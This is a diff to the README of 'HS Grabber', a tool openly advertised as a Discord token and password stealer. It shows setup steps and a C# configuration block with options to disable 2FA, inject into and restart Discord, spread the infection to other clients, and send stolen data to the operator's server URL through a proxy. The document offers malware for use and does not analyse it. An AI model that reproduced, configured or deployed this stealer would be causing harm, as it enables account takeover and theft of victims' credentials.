@@ -1,5 +1,7 @@
 # HS Grabber
-An powerful discord token grabber / discord token stealer stole discord password, info, etc, same when you change password.
+An powerful discord token grabber / discord token stealer stole discord password, info, etc, same when you change password. (Need a screenshot ?)[https://github.com/Stanley-GF/HS-Grabber#Some-screenshot-of-the-grabber]
+
+10 Star = video tutorial
 
 # How to use
 
@@ -72,15 +74,15 @@ https://your-vps-ip/api/v1/send (replace your-vps-ip by ur real vps ip, obviousl
 
 ```cs
 
-		public static bool disableMfa = false; // disable 2FA 
+public static bool disableMfa = false; // disable 2FA 
 
-		public static bool restartDiscord = true; // restart discord after injection
+public static bool restartDiscord = true; // restart discord after injection
 
-		public static bool spread = true; // ALWAYS TRUE : (for infect client)
+public static bool spread = true; // ALWAYS TRUE : (for infect client)
 
-		private static string serverurl = "https://your-app-name.herokuapp.com/api/v1/send"; // replace "your-app-name.herokuapp.com/api/v1/send" by your api url
+private static string serverurl = "https://your-app-name.herokuapp.com/api/v1/send"; // replace "your-app-name.herokuapp.com/api/v1/send" by your api url
 
-		public static string Url = "https://cors-anywhere2.herokuapp.com/" + serverurl; // don't tuch.
+public static string Url = "https://cors-anywhere2.herokuapp.com/" + serverurl; // don't tuch.
 ```
 
 * Compile the project
